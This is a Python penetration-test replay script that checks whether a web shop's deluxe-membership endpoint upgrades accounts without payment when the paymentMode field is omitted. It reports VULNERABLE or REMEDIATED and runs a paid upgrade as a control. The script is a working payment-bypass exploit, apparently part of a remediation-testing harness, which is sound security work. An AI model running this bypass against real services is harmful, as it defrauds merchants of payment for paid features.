#!/usr/bin/env python3
"""pt15: deluxe membership upgrades for free, no payment required.

upgradeToDeluxe only validates payment when paymentMode is exactly
"wallet" or "card". Any other value, including omitting the field
entirely, skips both payment branches and upgrades the account anyway.
No charge, no wallet debit, no card check: a default-deny branch for
an unrecognized payment mode was never written.

Standard library only (urllib, base64, json).
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt15-001.json"


def _jwt_payload(token: str) -> dict:
    payload_b64 = token.split(".")[1]
    padded = payload_b64 + "=" * (-len(payload_b64) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register_and_prime(target: str, label: str, stamp: str) -> tuple[str, int]:
    email = f"pt15-{label}-{stamp}@flatline.test"
    password = "Pt15Pass123!"
    _request("POST", f"{target}/api/Users", body={"email": email, "password": password, "passwordRepeat": password})
    status, body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    token = body["authentication"]["token"]
    user_id = _jwt_payload(token)["data"]["id"]
    _request("GET", f"{target}/rest/user/whoami", token=token)  # prime the cache appendUserId needs
    return token, user_id


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    exploit_token, exploit_id = _register_and_prime(target, "exploit", stamp)
    exploit_status, exploit_body = _request("POST", f"{target}/rest/deluxe-membership", token=exploit_token, body={})
    exploit_token_result = exploit_body.get("data", {}).get("token", "")
    exploit_role = _jwt_payload(exploit_token_result).get("data", {}).get("role") if exploit_token_result else None

    if exploit_status in (400, 403):
        status = "REMEDIATED"
        summary = f"Blocked with HTTP {exploit_status}."
    elif exploit_status == 200 and exploit_role == "deluxe":
        status = "VULNERABLE"
        summary = "Upgraded to deluxe with no paymentMode field at all; no payment of any kind was processed."
    else:
        status = "ERROR"
        summary = f"Inconclusive: HTTP {exploit_status}, role={exploit_role!r}."

    # Legitimate path: a real card, a real wallet top-up, a real wallet payment.
    legit_token, legit_id = _register_and_prime(target, "legit", stamp)
    _, card_body = _request(
        "POST", f"{target}/api/Cards", token=legit_token,
        body={"fullName": "pt15 legit", "cardNum": "1234567890123456", "expMonth": 12, "expYear": 2085},
    )
    card_id = card_body["data"]["id"]
    _request("PUT", f"{target}/rest/wallet/balance", token=legit_token, body={"paymentId": card_id, "balance": 100})
    legit_status, legit_resp = _request("POST", f"{target}/rest/deluxe-membership", token=legit_token, body={"paymentMode": "wallet"})
    legit_token_result = legit_resp.get("data", {}).get("token", "")
    legit_role = _jwt_payload(legit_token_result).get("data", {}).get("role") if legit_token_result else None
    legitimate_paid_upgrade_ok = legit_status == 200 and legit_role == "deluxe"

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "target": target,
        "status": status,
        "exploit_http_status": exploit_status,
        "summary": summary,
        "legitimate_paid_upgrade_ok": legitimate_paid_upgrade_ok,
        "legitimate_paid_upgrade_http_status": legit_status,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt15-free-deluxe-membership", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
